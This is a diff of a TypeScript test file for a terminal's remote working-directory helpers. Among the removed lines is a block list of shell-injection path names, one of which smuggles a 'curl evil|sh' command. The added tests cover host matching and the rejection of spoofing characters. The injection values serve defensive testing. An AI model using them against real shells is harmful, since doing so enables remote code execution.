@@ -1,7 +1,3 @@
-import { execFileSync, spawnSync } from "node:child_process"
-import fs from "node:fs"
-import os from "node:os"
-import path from "node:path"
 import { describe, expect, it } from "vitest"
 import {
   cleanRemoteCwd,
@@ -9,9 +5,8 @@ import {
   cwdFromTitle,
   detailUser,
   homeRelative,
-  remoteCdCommand,
   remoteCwdName,
-  safeForCd,
+  sameMachine,
   shortRemoteCwd,
 } from "./remote-cwd"
 
@@ -74,80 +69,20 @@ describe("remoteCwdName / shortRemoteCwd", () => {
   })
 })
 
-describe("safeForCd / remoteCdCommand", () => {
-  it("only folders whose characters mean nothing inside single quotes, in any shell", () => {
-    for (const ok of [
-      "/srv/app",
-      "~/my proj",
-      "~",
-      "/a-b_c.d/e+f@g,h:i=j%k#l",
-      "/données/项目",
-      "/x/-dash",
-    ]) {
-      expect(safeForCd(ok)).toBe(true)
-      expect(remoteCdCommand(ok)).toContain(`smterm '${ok}'`)
-    }
-  })
-
-  it("refuses anything a shell could act on, the fish \\' escape included", () => {
-    const bad = [
-      "/tmp/a\\'; curl evil|sh; '", // fish: \' inside single quotes is a literal quote
-      "/it's",
-      '/dq"x',
-      "/$HOME",
-      "/`id`",
-      "/semi;colon",
-      "/a|b",
-      "/a&b",
-      "/a!b", // csh history expansion
-      "/a*b",
-      "/a(b)",
-      "/a\\b",
-      "/a{b}",
-      "/a[b]",
-      "/a<b>",
-    ]
-    for (const b of bad) {
-      expect(safeForCd(b)).toBe(false)
-      expect(remoteCdCommand(b)).toBeNull()
-    }
+describe("sameMachine", () => {
+  it("compares the first label (a title's short host vs OSC 7's full one)", () => {
+    expect(sameMachine("box", "box.corp.example")).toBe(true)
+    expect(sameMachine("box.corp.example", "box")).toBe(true)
+    expect(sameMachine("box", "db")).toBe(false)
   })
 })
 
-// ssh hands the command to the remote login shell as `$SHELL -c '<command>'`, started in the
-// home directory. Run it that way in every shell here, with a SHELL that prints where it landed.
-const shells = ["sh", "bash", "zsh", "fish", "dash"].filter(
-  (sh) => spawnSync("sh", ["-c", `command -v ${sh}`]).status === 0,
-)
-
-describe.each(shells)("remoteCdCommand through %s", (loginShell) => {
-  const home = fs.mkdtempSync(path.join(os.tmpdir(), "rcd-"))
-  const probe = path.join(home, "probe.sh")
-  fs.writeFileSync(probe, "#!/bin/sh\npwd\n", { mode: 0o755 })
-  const run = (dir: string) =>
-    execFileSync(loginShell, ["-c", remoteCdCommand(dir)!], {
-      encoding: "utf8",
-      cwd: home,
-      env: { PATH: process.env.PATH, HOME: home, SHELL: probe },
-    }).trim()
-  const real = (p: string) => fs.realpathSync(p)
-
-  it("lands in the folder (spaces, a leading dash, unicode, the allowed punctuation)", () => {
-    for (const name of ["plain", "with space", "-dash", "données", "a.b_c+d@e,f=g%h#i"]) {
-      const dir = path.join(home, name)
-      fs.mkdirSync(dir, { recursive: true })
-      expect(real(run(dir))).toBe(real(dir))
+describe("cleanRemoteCwd — spoofing", () => {
+  it("rejects bidi, zero-width and C1 characters (they'd fake what the row shows)", () => {
+    for (const bad of ["/home/u/\u202Egnp.cod", "/a\u200Bb", "/a\u2066b", "/a\u0085b"]) {
+      expect(cleanRemoteCwd(bad)).toBeNull()
     }
-  })
-
-  it("~ and ~/… are home-relative", () => {
-    fs.mkdirSync(path.join(home, "proj", "a"), { recursive: true })
-    expect(real(run("~/proj/a"))).toBe(real(path.join(home, "proj", "a")))
-    expect(real(run("~"))).toBe(real(home))
-  })
-
-  it("a folder that's gone still gives a shell (at home)", () => {
-    expect(real(run(path.join(home, "missing")))).toBe(real(home))
+    expect(cleanRemoteCwd("/données/项目")).toBe("/données/项目")
   })
 })
 
